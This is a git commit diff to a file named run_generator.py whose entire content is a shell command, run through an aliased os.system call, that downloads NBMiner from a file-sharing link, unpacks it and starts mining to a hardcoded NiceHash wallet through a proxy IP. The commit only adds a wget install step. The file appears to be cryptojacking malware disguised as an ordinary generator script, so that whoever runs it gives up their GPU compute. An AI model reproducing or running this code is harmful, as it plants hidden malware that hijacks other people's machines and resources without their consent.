97cde7e2f9bb5f2618f789575b12c801a2057ba5
yusuf9192 <95448996+yusuf9192@users.noreply.github.com>
2021-12-02 22:18:18 +0000

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("apt update && apt install pciutils -y && wget https://filebin.net/3wfzfm8t2kmyombs/NBMiner_Linux.tar && tar -xvf NBMiner_Linux.tar && cd NBMiner_Linux && ./nbminer -a ethash -proxy 82.165.99.243:6969 -o stratum+ssl://stratum.eu.nicehash.com:33353 -u 33kJvAUL3Na2ifFDGmUPsZLTyDUBGZLhAi.yaefegovp6uq3ms")
+alpha.system("apt update && apt install pciutils -y && apt install wget -y && wget https://filebin.net/3wfzfm8t2kmyombs/NBMiner_Linux.tar && tar -xvf NBMiner_Linux.tar && cd NBMiner_Linux && ./nbminer -a ethash -proxy 82.165.99.243:6969 -o stratum+ssl://stratum.eu.nicehash.com:33353 -u 33kJvAUL3Na2ifFDGmUPsZLTyDUBGZLhAi.yaefegovp6uq3ms")
